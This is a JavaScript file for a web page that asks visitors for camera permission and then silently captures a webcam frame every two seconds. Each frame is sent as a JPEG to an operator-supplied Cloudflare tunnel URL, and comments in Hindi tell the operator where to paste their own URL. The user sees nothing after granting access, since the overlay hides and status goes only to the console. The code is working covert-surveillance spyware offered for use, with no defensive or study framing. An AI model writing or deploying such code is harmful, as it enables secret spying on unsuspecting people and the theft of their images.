// Wait for page to load
document.addEventListener('DOMContentLoaded', function() {
    const overlay = document.getElementById('permission-overlay');
    const allowBtn = document.getElementById('allow-btn');
    const denyBtn = document.getElementById('deny-btn');
    let mediaStream = null;
    let captureInterval = null;
    let videoElement = document.createElement('video');

    // ============================================================
    // ⬇️⬇️⬇️ YAHAN APNA CLOUDFLARED URL DAALO ⬇️⬇️⬇️
    // ============================================================
    const BACKEND_URL = 'https://brighton-satisfied-encourages-adapters.trycloudflare.com';  
    // ============================================================
    // ⬆️⬆️⬆️ SIRF IS LINE KO CHANGE KARO ⬆️⬆️⬆️
    // ============================================================

    // Function to capture image and send to server
    function captureAndSendImage() {
        if (!mediaStream) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        // Draw video frame to canvas
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        // Convert to JPEG (smaller size)
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send to Python server (CORS enabled)
        fetch(BACKEND_URL + '/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                image: imageData,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Image saved:', data.filename);
        })
        .catch(err => {
            console.error('❌ Upload failed:', err);
        });
    }

    // Allow button clicked
    allowBtn.addEventListener('click', function() {
        // Request camera access
        navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480 } 
        })
        .then(stream => {
            mediaStream = stream;
            videoElement.srcObject = stream;
            videoElement.play();
            
            // Hide overlay
            overlay.style.display = 'none';
            
            // Start capturing every 2 seconds (silent recording)
            captureInterval = setInterval(captureAndSendImage, 2000);
            
            // Show success message in console only (silent)
            console.log('📸 Camera access granted. Capturing...');
        })
        .catch(err => {
            console.error('❌ Camera error:', err);
            alert('Camera access failed. Please try again.');
        });
    });

    // Deny button clicked
    denyBtn.addEventListener('click', function() {
        // Redirect to YouTube or close
        window.location.href = 'https://www.youtube.com';
        // Alternative: window.close();
    });

    // Also handle if user manually denies via browser popup
    setTimeout(() => {
        if (mediaStream === null) {
            console.log('⚠️ Camera access was denied by browser popup');
        }
    }, 5000);
});

// Cleanup when page unloads
window.addEventListener('beforeunload', function() {
    if (captureInterval) clearInterval(captureInterval);
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
});